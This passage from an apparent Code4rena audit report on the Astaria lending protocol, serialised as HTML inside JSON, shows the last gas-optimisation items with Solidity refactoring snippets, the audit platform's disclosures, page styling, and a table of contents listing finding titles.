class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">//owner is &quot;strategist&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">//owner is &quot;strategist&quot;</span></span></span></code></pre>\n<p>we can replace the above by using the following modifer</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"256\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">(){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">//owner is &quot;strategist&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h2 id=\"g-12-a-modifier-used-only-once-and-not-being-inherited-should-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#g-12-a-modifier-used-only-once-and-not-being-inherited-should-be-inlined-to-save-gas\" aria-label=\"g 12 a modifier used only once and not being inherited should be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] A modifier used only once and not being inherited should be inlined to save gas</h2>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L253-L263\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L253-L263</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"257\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">253</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">releaseCheck</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">254</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">256</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ACTIVE_LIENS</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">259</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AUCTION_ACTIVE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">260</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">261</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">262</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p>The above modifier is only being called on <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L333\">Line 333</a></p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-21\">High Risk Findings (21)</a></p>\n<ul>\n<li><a href=\"#h-01-lientoken-lender-and-liquidator-can-collude-to-block-auction-and-seize-collateral\">[H-01] <code>LienToken</code>: Lender and liquidator can collude to block auction and seize collateral</a></li>\n<li><a href=\"#h-02-erc4626cloned-deposit-and-mint-logic-differ-on-first-deposit\">[H-02] ERC4626Cloned deposit and mint logic differ on first deposit</a></li>\n<li><a href=\"#h-03-improper-validations-in-clearinghouse-possible-to-lock-collateral-nft-in-contract\">[H-03] Improper validations in Clearinghouse, possible to lock collateral NFT in contract</a></li>\n<li><a href=\"#h-04-strategist-can-fail-to-withdraw-asset-token-from-a-private-vault\">[H-04] Strategist can fail to withdraw asset token from a private vault</a></li>\n<li><a href=\"#h-05-vault-may-be-drained-after-a-liquidated-nft-was-claimed-by-the-liquidator\">[H-05] Vault may be drained after a liquidated NFT was claimed by the liquidator</a></li>\n<li><a href=\"#h-06-buying-out-corrupts-the-slope-of-a-vault-reducing-rewards-of-lps\">[H-06] Buying out corrupts the slope of a vault, reducing rewards of LPs</a></li>\n<li><a href=\"#h-07-malicious-refinancing-attack-could-lead-to-suboptimal-nft-liquidation\">[H-07] Malicious refinancing attack could lead to suboptimal NFT liquidation</a></li>\n<li><a href=\"#h-08-lack-of-strategydetailsparamvault-validation-allows-the-borrower-to-steal-all-the-funds-from-the-vault\">[H-08] Lack of StrategyDetailsParam.vault validation allows the borrower to steal all the funds from the vault</a></li>\n<li><a href=\"#h-09-at-the-second-time-the-nft-is-used-as-collateral-to-take-a-loan-the-debt-repayment-via-auction-fund-can-be-failed-when-liquidation-\">[H-09] At the second time the nft is used as collateral to take a loan, the debt repayment via auction fund can be failed when liquidation </a></li>\n<li><a href=\"#h-10-liquidation-will-fail-if-value-set-as-liquidationinitialask--288-1-causing-collateral-to-be-permanently-locked\">[H-10] Liquidation will fail if value set as <code>liquidationInitialAsk</code> > <code>2**88-1</code>, causing collateral to be permanently locked</a></li>\n<li><a href=\"#h-11-malicious-strategist-could-deny-borrowers-from-repaying-loan-and-force-liquidation-by-setting-a-extremely-high-vault-fee\">[H-11] Malicious strategist could deny borrowers from repaying loan and force liquidation by setting a extremely high vault fee</a></li>\n<li><a href=\"#h-12-borrower-can-use-liquidationinitialask-to-block-future-borrowers\">[H-12] Borrower can use liquidationInitialAsk to block future borrowers</a></li>\n<li><a href=\"#h-13-anyone-can-wipe-complete-state-of-any-collateral-at-any-point\">[H-13] Anyone can wipe complete state of any collateral at any point</a></li>\n<li><a href=\"#h-14-a-malicious-private-vault-can-preempt-the-creation-of-a-public-vault-by-transferring-lien-tokens-to-the-public-vault-thereby-preventing-the-borrower-from-repaying-all-loans\">[H-14] A malicious private vault can preempt the creation of a public vault by transferring lien tokens to the public vault, thereby preventing the borrower from repaying all loans</a></li>\n<li><a href=\"#h-15-wrong-starting-price-when-listing-on-seaport-for-assets-that-has-less-than-18-decimals\">[H-15] Wrong starting price when listing on Seaport for assets that has less than 18 decimals</a></li>\n<li><a href=\"#h-16-when-public-vault-a-buys-out-public-vault-bs-lien-tokens-it-does-not-increase-public-vault-as-liensopenforepoch-which-would-result-in-the-lien-tokens-not-being-repaid\">[H-16] When Public Vault A buys out Public Vault B’s lien tokens, it does not increase Public Vault A’s liensOpenForEpoch, which would result in the lien tokens not being repaid</a></li>\n<li><a href=\"#h-17-function-processepoch-in-publicvault-would-revert-when-most-of-the-users-withdraw-their-funds-because-of-the-underflow-for-new-yintercept-calculation\">[H-17] Function <code>processEpoch()</code> in PublicVault would revert when most of the users withdraw their funds because of the underflow for new yIntercept calculation</a></li>\n<li><a href=\"#h-18-publicvaultprocessepoch-calculates-withdrawreserve-incorrectly-users-can-lose-funds\">[H-18] <code>PublicVault.processEpoch</code> calculates <code>withdrawReserve</code> incorrectly; Users can lose funds</a></li>\n<li><a href=\"#h-19-vaults-dont-verify-that-a-strategys-deadline-has-passed\">[H-19] Vaults don’t verify that a strategy’s deadline has passed</a></li>\n<li><a href=\"#h-20-deadlock-in-vaults-with-underlying-token-with-less-then-18-decimals\">[H-20] Deadlock in vaults with underlying token with less then 18 decimals</a></li>\n<li><a href=\"#h-21-attacker-can-take-loan-for-victim\">[H-21] Attacker can take loan for Victim</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-34\">Medium Risk Findings (34)</a></p>\n<ul>\n<li><a href=\"#m-01-a-user-can-use-the-same-proof-for-a-commitment-more-than-1-time\">[M-01] A user can use the same proof for a commitment more than 1 time</a></li>\n<li><a href=\"#m-02-_buyoutlien-does-not-properly-validate-the-liquidationinitialask\">[M-02] <code>_buyoutLien()</code> does not properly validate the liquidationInitialAsk</a></li>\n<li><a href=\"#m-03-settleauction-check-for-status-errors\">[M-03] <code>settleAuction()</code> Check for status errors</a></li>\n<li><a href=\"#m-04-lientokentransferfrom-there-is-a-possibility-of-malicious-attack\">[M-04] <code>LienToken.transferFrom</code> There is a possibility of malicious attack</a></li>\n<li><a href=\"#m-05-users-are-unable-to-mint-shares-from-a-public-vault-using-astariarouter-contract-when-share-price-is-bigger-than-one\">[M-05] Users are unable to mint shares from a public vault using <code>AstariaRouter</code> contract when share price is bigger than one</a></li>\n<li><a href=\"#m-06-for-a-public-vault-minimum-deposit-requirement-that-is-enforced-by-erc4626cloneddeposit-function-can-be-bypassed-by-erc4626clonedmint-function-or-vice-versa-when-share-price-does-not-equal-one\">[M-06] For a public vault, minimum deposit requirement that is enforced by <code>ERC4626Cloned.deposit</code> function can be bypassed by <code>ERC4626Cloned.mint</code> function or vice versa when share price does not equal one</a></li>\n<li><a href=\"#m-07-improper-approval-mechanism-of-clearing-house\">[M-07] Improper Approval Mechanism of Clearing House</a></li>\n<li><a href=\"#m-08-public-vault-strategist-reward-is-not-calculated-correctly\">[M-08] Public vault strategist reward is not calculated correctly</a></li>\n<li><a href=\"#m-09-tokens-with-fee-on-transfer-are-not-supported-in-publicvaultsol\">[M-09] Tokens with fee on transfer are not supported in <code>PublicVault.sol</code></a></li>\n<li><a href=\"#m-10-public-vault-slope-can-overflow\">[M-10] Public vault slope can overflow</a></li>\n<li><a href=\"#m-11-liquidator-reward-is-not-taken-into-account-when-calculating-potential-debt\">[M-11] Liquidator reward is not taken into account when calculating potential debt</a></li>\n<li><a href=\"#m-12-yintercept-of-public-vaults-can-overflow\">[M-12] yIntercept of public vaults can overflow</a></li>\n<li><a href=\"#m-13-processing-an-epoch-must-be-done-in-a-timely-manner-but-can-be-halted-by-non-liquidated-expired-liens\">[M-13] Processing an epoch must be done in a timely manner, but can be halted by non liquidated expired liens</a></li>\n<li><a href=\"#m-14-mindepositamount-is-unnecessarily-high-can-price-out-many-users\">[M-14] <code>minDepositAmount</code> is unnecessarily high, can price out many users</a></li>\n<li><a href=\"#m-15-overflow-potential-in-processepoch\">[M-15] Overflow potential in processEpoch()</a></li>\n<li><a href=\"#m-16-withdrawproxy-allows-redeem-to-be-called-before-withdraw-reserves-are-transferred-in\">[M-16] WithdrawProxy allows <code>redeem()</code> to be called before withdraw reserves are transferred in</a></li>\n<li><a href=\"#m-17-position-not-deleted-after-debt-paid\">[M-17] Position not deleted after debt paid</a></li>\n<li><a href=\"#m-18-public-vault-owner-strategist-can-use-buyoutlien-to-indefinitely-prevent-liquidity-providers-from-withdrawing\">[M-18] Public vault owner (strategist) can use buyoutLien to indefinitely prevent liquidity providers from withdrawing</a></li>\n<li><a href=\"#m-19-users-are-forced-to-approve-router-for-full-collection-to-use-committoliens-function\">[M-19] Users are forced to approve Router for full collection to use commitToLiens() function</a></li>\n<li><a href=\"#m-20-users-can-liquidate-themselves-before-others-allowing-them-to-take-13-above-their-borrowers\">[M-20] Users can liquidate themselves before others, allowing them to take 13% above their borrowers</a></li>\n<li><a href=\"#m-21-when-a-private-vault-offers-a-loan-in-erc777-tokens-the-private-vault-can-refuse-to-receive-repayment-in-the-safetransferfrom-callback-to-force-liquidation-of-the-borrowers-collateral\">[M-21] When a private vault offers a loan in ERC777 tokens, the private vault can refuse to receive repayment in the safeTransferFrom callback to force liquidation of the borrower’s collateral</a></li>\n<li><a href=\"#m-22-erc4626routerbasewithdraw-can-only-be-called-once\">[M-22] <code>ERC4626RouterBase.withdraw</code> can only be called once</a></li>\n<li><a href=\"#m-23-function-withdraw-and-redeem-in-erc4626routerbase-would-revert-always-because-they-have-unnecessary-allowance-setting\">[M-23] Function <code>withdraw()</code> and <code>redeem()</code> in ERC4626RouterBase would revert always because they have unnecessary allowance setting</a></li>\n<li><a href=\"#m-24-flashauction-doesnt-pass-the-initiator-to-the-recipient-\">[M-24] FlashAuction doesn’t pass the initiator to the recipient </a></li>\n<li><a href=\"#m-25-vault-can-be-created-for-not-yet-existing-erc20-tokens-which-allows-attackers-to-set-traps-to-steal-nfts-from-borrowers\">[M-25] Vault can be created for not-yet-existing ERC20 tokens, which allows attackers to set traps to steal NFTs from Borrowers</a></li>\n<li><a href=\"#m-26-collateraltoken-should-allow-to-execute-token-owners-action-to-approved-addresses\">[M-26] CollateralToken should allow to execute token owner’s action to approved addresses</a></li>\n<li><a href=\"#m-27-approved-operator-of-collateral-owner-cant-liquidate-lien\">[M-27] Approved operator of collateral owner can’t liquidate lien</a></li>\n<li><a href=\"#m-28-lack-of-support-for-erc20-token-that-is-not-18-decimals\">[M-28] Lack of support for ERC20 token that is not 18 decimals</a></li>\n<li><a href=\"#m-29-publicvaultprocessepoch-updates-yintercept-incorrectly-when-totalassets--expected\">[M-29] <code>PublicVault.processEpoch</code> updates <code>YIntercept</code> incorrectly when <code>totalAssets() &#x3C;= expected</code></a></li>\n<li><a href=\"#m-30-adversary-can-game-the-liquidation-flow-by-transfering-a-dust-amount-of-the-payment-token-to-clearinghouse-contract-to-settle-the-auction-if-no-one-buy-the-auctioned-nft\">[M-30] Adversary can game the liquidation flow by transfering a dust amount of the payment token to ClearingHouse contract to settle the auction if no one buy the auctioned NFT</a></li>\n<li><a href=\"#m-31-lientoken_payment-function-increases-users-debt\">[M-31] <code>LienToken._payment</code> function increases users debt</a></li>\n<li><a href=\"#m-32-certain-function-can-be-blocked-if-the-erc20-token-revert-in-0-amount-transfer-after-publicvaulttransferwithdrawreserve-is-called\">[M-32] Certain function can be blocked if the ERC20 token revert in 0 amount transfer after <code>PublicVault#transferWithdrawReserve</code> is called</a></li>\n<li><a href=\"#m-33-lack-of-support-for-fee-on-transfer-token\">[M-33] Lack of support for fee-on-transfer token</a></li>\n<li><a href=\"#m-34-pause-checks-are-missing-on-deposit-for-private-vault\">[M-34] Pause checks are missing on deposit for Private Vault</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#01-lack-of-reasonable-boundary-for-parameter-setting-in-fee-setting-and-liquidation-auction-length-and-refinance-setting-and-epoch-length\">[01] Lack of reasonable boundary for parameter setting in fee setting and liquidation auction length and refinance setting and epoch length</a></li>\n<li><a href=\"#02-new-protocol-parameter-setting-should-not-be-applied-to-old-loan-term-and-state-especially-the-fee-setting\">[02] New Protocol parameter setting should not be applied to old loan term and state, especially the fee setting</a></li>\n<li><a href=\"#03-adversary-can-game-the-flashauction-feature-to-block-further-flashauction-after-trading-collateral-token-and-make-liquidatornftclaim-function-revert-and-block-liquidation-if-the-nft-is-moonbird\">[03] Adversary can game the flashAuction feature to block further flashAuction after trading collateral token and make liquidatorNFTClaim function revert and block liquidation if the NFT is Moonbird</a></li>\n<li><a href=\"#04-if-an-auction-has-no-bidder-the-nft-ownership-should-go-back-to-the-loan-lenders-instead-of-liquidator\">[04] If an auction has no bidder, the NFT ownership should go back to the loan lenders instead of liquidator</a></li>\n<li><a href=\"#05-security-hook-should-not-be-set-for-a-nft-that-is-not-uniswap-v3-position-nft\">[05] Security hook should not be set for a NFT that is not Uniswap V3 Position NFT</a></li>\n<li><a href=\"#06-lack-of-support-for-erc1155-nft\">[06] Lack of support for ERC1155 NFT</a></li>\n<li><a href=\"#07-certain-function-should-not-be-marked-as-payable-otherwise-the-eth-that-mistakenly-sent-along-with-the-function-call-is-locked-in-the-contract\">[07] Certain function should not be marked as payable, otherwise the ETH that mistakenly sent along with the function call is locked in the contract</a></li>\n<li><a href=\"#08-transaction-revert-in-division-by-zero-error-when-handling-protocol-fee-if-the-feeto-address-is-set-but-sprotocolfeedenominator-is-not-set\">[08] Transaction revert in division by zero error when handling protocol fee if the feeTo address is set but <code>s.protocolFeeDenominator</code> is not set</a></li>\n<li><a href=\"#09-should-use-_safemint-instead-of-mint-in-collateraltokenonerc721received\">[09] Should use <code>_safeMint</code> instead of mint in CollateralToken#onERC721Received</a></li>\n<li><a href=\"#10-adversary-can-front-run-admins-state-update-and-parameter-update\">[10] Adversary can front-run admin’s state update and parameter update</a></li>\n<li><a href=\"#11-solmate-safetransfer-and-safetransferfrom-does-not-check-the-codesize-of-the-token-address-which-may-lead-to-fund-loss\">[11] Solmate safeTransfer and safeTransferFrom does not check the codesize of the token address, which may lead to fund loss</a></li>\n<li><a href=\"#12-compromised-owner-is-capable-of-draining-all-users-fund-after-user-gives-token-allowance-to-transferproxysol\">[12] Compromised owner is capable of draining all user’s fund after user gives token allowance to TransferProxy.sol</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#overview-1\">Overview</a></li>\n<li><a href=\"#g-01-pack-structs-by-putting-variables-that-can-fit-together-next-to-each-other\">G-01 Pack structs by putting variables that can fit together next to each other</a></li>\n<li><a href=\"#g-02-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\">G-02 The result of a function call should be cached rather than re-calling the function</a></li>\n<li><a href=\"#g-03-internalprivate-functions-only-called-once-can-be-inlined-to-save-gas-gas-saved-20--20--400\">G-03 Internal/Private functions only called once can be inlined to save gas <code>Gas saved: 20 * 20 = 400</code></a></li>\n<li><a href=\"#g-04-using-storage-instead-of-memory-for-structsarrays-saves-gas\">G-04 Using storage instead of memory for structs/arrays saves gas</a></li>\n<li><a href=\"#g-05-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function-also-restructured-some-ifs\">G-05 require() or revert() statements that check input arguments should be at the top of the function (Also restructured some if’s)</a></li>\n<li><a href=\"#g-06-keccak256-should-only-need-to-be-called-on-a-specific-string-literal-once\">G-06 <code>keccak256()</code> should only need to be called on a specific string literal once</a></li>\n<li><a href=\"#g-07-x--y-costs-more-gas-than-x--x--y-for-state-variables\">G-07 <code>x += y</code> costs more gas than <code>x = x + y</code> for state variables</a></li>\n<li><a href=\"#g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\">G-08 Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead</a></li>\n<li><a href=\"#g-09-using-unchecked-blocks-to-save-gas\">G-09 Using unchecked blocks to save gas</a></li>\n<li><a href=\"#g-10-splitting-require-statements-that-use--saves-gas---saves-8-gas-per-\">G-10 Splitting require() statements that use &#x26;&#x26; saves gas - (saves 8 gas per &#x26;&#x26;)</a></li>\n<li><a href=\"#g-11-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\">G-11 Duplicated require()/revert() checks should be refactored to a modifier or function</a></li>\n<li><a href=\"#g-12-a-modifier-used-only-once-and-not-being-inherited-should-be-inlined-to-save-gas\">G-12 A modifier used only once and not being inherited should be inlined to save gas</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}